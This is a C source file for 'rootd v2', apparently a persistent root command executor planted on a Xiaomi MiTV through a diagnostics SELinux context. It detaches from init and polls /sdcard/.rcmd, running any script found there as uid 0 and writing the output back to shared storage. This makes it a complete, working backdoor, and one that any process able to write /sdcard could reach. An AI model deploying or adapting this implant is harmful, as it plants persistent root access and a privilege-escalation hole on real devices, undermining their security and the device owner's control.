/*
 * rootd v2 - persistent uid-0 command executor for MiTV (misysdiagnose ctx)
 *
 * Design constraints discovered on this device:
 *  - misysdiagnose SELinux domain CANNOT create sockets (nc -> EPERM),
 *    so no TCP shell is possible; we bridge over the filesystem instead.
 *  - It CAN live as a background process (verified) and CAN read/write
 *    /sdcard + /data/diagnosis (system_data_file / sdcardfs).
 *  - CRITICAL: the daemon must fully detach and redirect stdio to /dev/null,
 *    otherwise it keeps init's exec pipe open and deadlocks init's action
 *    queue (this already bricked command execution once).
 *
 * Protocol: write a shell script to /sdcard/.rcmd  -> output in /sdcard/.rout
 * Heartbeat: /sdcard/.rootd_alive (unix timestamp)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <sys/stat.h>

#define CMD_PATH  "/sdcard/.rcmd"
#define OUT_PATH  "/sdcard/.rout"
#define BEACON    "/sdcard/.rootd_alive"
#define LOG_PATH  "/sdcard/rootd.log"

static void logln(const char *s)
{
    int fd = open(LOG_PATH, O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (fd >= 0) {
        char b[256];
        int n = snprintf(b, sizeof(b), "[pid=%d uid=%d] %s\n",
                         getpid(), getuid(), s);
        if (n > 0) write(fd, b, (size_t)n);
        close(fd);
    }
}

int main(void)
{
    /* ---- fully detach so init's exec pipe is released ---- */
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);

    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
        if (fd > 2) close(fd);
    }
    chdir("/");
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP,  SIG_IGN);

    setenv("PATH", "/system/bin:/vendor/bin:/system/xbin:/sbin", 1);

    {
        char b[128];
        snprintf(b, sizeof(b), "rootd v2 up, polling %s", CMD_PATH);
        logln(b);
    }

    for (;;) {
        struct stat st;

        /* heartbeat */
        int h = open(BEACON, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (h >= 0) {
            char b[32];
            int n = snprintf(b, sizeof(b), "%ld\n", (long)time(NULL));
            if (n > 0) write(h, b, (size_t)n);
            close(h);
        }

        if (stat(CMD_PATH, &st) == 0 && st.st_size > 0) {
            logln("exec .rcmd");
            unlink(OUT_PATH);
            system("/system/bin/sh " CMD_PATH " > " OUT_PATH " 2>&1");
            unlink(CMD_PATH);
            logln("done -> .rout");
        }
        usleep(300000);   /* 300ms */
    }
    return 0;
}
